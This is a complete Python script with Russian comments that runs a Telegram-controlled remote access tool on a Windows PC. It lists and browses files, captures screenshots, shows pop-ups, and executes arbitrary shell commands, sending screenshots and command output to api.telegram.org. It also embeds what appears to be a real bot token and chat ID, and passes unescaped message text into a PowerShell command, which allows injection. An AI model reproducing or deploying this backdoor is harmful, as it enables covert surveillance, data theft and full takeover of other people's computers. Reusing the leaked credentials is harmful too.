import os
import requests
import time
import subprocess
from io import BytesIO
from PIL import ImageGrab

# ВСТАВЬ СВОЙ ТОКЕН И ID
BOT_TOKEN = "9088325911:AAFAY2MJERZKOWedZE2gDrl2BEf6RsPQ0Ng"
CHAT_ID = "8057513929"

# Текущая папка
current_dir = os.getcwd()

def send_message(text):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": text})
    except: pass

def main():
    global current_dir
    last_update_id = None
    send_message(f"💻 ПК-Бот запущен!\nПапка: {current_dir}")
    
    while True:
        try:
            updates = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", params={"timeout": 100, "offset": last_update_id}).json()
            if "result" in updates:
                for update in updates["result"]:
                    last_update_id = update["update_id"] + 1
                    if "message" in update and "text" in update["message"]:
                        command = update["message"]["text"].replace("/", "").strip()
                        
                        # 1. Список файлов
                        if command == "files":
                            try:
                                files = os.listdir(current_dir)
                                send_message(f"Файлы в {current_dir}:\n" + "\n".join(files[:30]))
                            except Exception as e:
                                send_message(f"Ошибка: {e}")

                        # 2. Переход по папкам
                        elif command.startswith("cd "):
                            new_dir = command[3:].strip()
                            try:
                                os.chdir(new_dir)
                                current_dir = os.getcwd()
                                send_message(f"Перешли в: {current_dir}")
                            except Exception as e:
                                send_message(f"Ошибка: {e}")
                                
                        # 3. Скриншот
                        elif command == "screen":
                            try:
                                img = ImageGrab.grab()
                                buffer = BytesIO()
                                img.save(buffer, format="PNG")
                                buffer.seek(0)
                                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", data={"chat_id": CHAT_ID}, files={"photo": buffer})
                            except Exception as e:
                                send_message(f"Ошибка скрина: {e}")
                                
                        # 4. Сообщение на экране (msg)
                        elif command.startswith("msg "):
                            text = command[4:]
                            try:
                                # Используем PowerShell для всплывающего окна
                                ps_command = f'Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show("{text}", "Сообщение от бота")'
                                subprocess.Popen(["powershell", "-Command", ps_command])
                                send_message(f"Сообщение '{text}' отправлено на ПК.")
                            except Exception as e:
                                send_message(f"Ошибка msg: {e}")

                        # 5. Системные команды (cmd)
                        elif command.startswith("cmd "):
                            cmd = command[4:]
                            try:
                                res = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True, encoding='cp866', cwd=current_dir)
                                send_message(f"Результат:\n{res[:2000]}")
                            except subprocess.CalledProcessError as e:
                                send_message(f"Ошибка:\n{e.output[:2000]}")

                        elif command != "start":
                            send_message("Команды: files, cd <папка>, screen, msg <текст>, cmd <команда>")
        except Exception as e:
            print(f"Ошибка: {e}")
        time.sleep(1)

if __name__ == "__main__":
    main()
